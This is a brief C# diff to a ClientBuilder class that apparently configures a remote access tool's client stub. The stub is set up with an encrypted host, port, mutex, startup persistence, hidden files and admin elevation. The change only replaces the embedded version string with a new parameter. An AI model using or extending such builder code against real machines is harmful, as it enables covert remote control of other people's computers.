@@ -10,7 +10,7 @@ namespace Core.Build
 {
     class ClientBuilder
     {
-        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo)
+        public static void Build(string output, string host, string password, string installsub, string installname, string mutex, string startupkey, bool install, bool startup, bool hidefile, int port, int reconnectdelay, int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
             string encKey = Helper.GetRandomName(20);
@@ -33,7 +33,7 @@ namespace Core.Build
                                     switch (strings)
                                     {
                                         case 1: //version
-                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(Application.ProductVersion, encKey);
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(version, encKey);
                                             break;
                                         case 2: //ip/hostname
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(host, encKey);
